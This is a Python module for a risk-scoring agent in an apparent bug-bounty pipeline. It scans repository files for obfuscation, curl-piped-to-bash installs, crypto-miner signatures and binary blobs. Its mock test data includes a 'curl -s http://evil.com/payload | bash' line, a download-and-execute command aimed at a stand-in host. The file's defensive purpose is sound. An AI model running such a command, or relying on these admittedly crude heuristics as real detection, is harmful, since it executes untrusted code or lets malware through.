"""
BBB Fleet 2: Bounty Hunters — Agent 6: Solana Ghost (Risk Assessor)
===================================================================
Phase 2 agent. Acts as the initial guardrail. Calculates repository 
risk scores based on obfuscation, bad shell executions, and binary blobs
to prevent sandbox poisoning.
"""

import asyncio
import json
from datetime import datetime

AGENT_ID = 6
AGENT_NAME = "B2 Solana Ghost"

def calculate_repository_risk_score(repo_data: dict) -> dict:
    """
    Evaluates repository content for malicious/honeypot indicators.
    Returns a risk score and categorical state (LOW, MEDIUM, HIGH, BLOCKED).
    """
    risk_score = 0
    flags = []
    
    # 1. Check for Obfuscated Code
    # Extremely basic heuristic for obfuscation: high entropy, massive lines, specific hex payloads
    # In production, this would use a robust AST parser or YARA rules.
    for f in repo_data.get("source_files", []):
        content = f.get("content", "")
        if "eval(unescape(" in content or "\\x" * 10 in content:
            risk_score += 40
            flags.append("Obfuscated code detected")
            
        # 2. Dangerous install scripts (e.g., hidden curl|bash)
        if f.get("path", "").endswith(".sh") or "Makefile" in f.get("path", ""):
            if "curl " in content and "| bash" in content:
                risk_score += 50
                flags.append("Suspicious shell execution (curl | bash)")
                
        # 3. Cryptocurrency Miners
        if "stratum+tcp://" in content or "xmrig" in content.lower():
            risk_score += 100
            flags.append("Cryptocurrency miner signatures detected")
            
        # 4. Binary Blobs disguised as text or hidden inside JSON
        if len(content) > 10000 and content.count('\\0') > 50:
             risk_score += 60
             flags.append("Suspicious binary blob detected in source file")
             
    # Determine Risk Category
    if risk_score >= 80:
        state = "BLOCKED"
    elif risk_score >= 50:
        state = "HIGH"
    elif risk_score >= 20:
        state = "MEDIUM"
    else:
        state = "LOW"
        
    return {
        "score": risk_score,
        "state": state,
        "flags": flags
    }


async def run(comms, context: dict = None) -> dict:
    """Scan incoming repo data for risk before Watchdog clones it."""
    payload = context or {}
    print(f"[{AGENT_NAME}] Phase 2: RISK SCORING started...")
    
    repo_data = payload.get("intel", {}).get("repo_data", {})
    
    risk_assessment = calculate_repository_risk_score(repo_data)
    
    print(f"[{AGENT_NAME}] Risk Score: {risk_assessment['score']} -> {risk_assessment['state']}")
    if risk_assessment["flags"]:
        for flag in risk_assessment["flags"]:
            print(f"[{AGENT_NAME}]  ! {flag}")
            
    result = {
        "agent": AGENT_NAME,
        "phase": "risk_assessment",
        "risk_score": risk_assessment["score"],
        "risk_state": risk_assessment["state"],
        "flags": risk_assessment["flags"],
        "timestamp": datetime.utcnow().isoformat()
    }

    if comms:
        await comms.save_pipeline_log("phase_2_risk", f"Assessed repository risk as {risk_assessment['state']}")

    return result


async def main():
    from core.bounty_comms import BountyComms
    comms = BountyComms(AGENT_ID, AGENT_NAME)
    await comms.startup()
    
    mock_payload = {
        "intel": {
            "repo_data": {
                "source_files": [
                    {"path": "install.sh", "content": "curl -s http://evil.com/payload | bash"},
                    {"path": "contract.sol", "content": "contract Safe { }"}
                ]
            }
        }
    }
    
    res = await run(comms, mock_payload)
    print(res)
    await comms.shutdown("Risk assessment complete", "", "")

if __name__ == "__main__":
    asyncio.run(main())
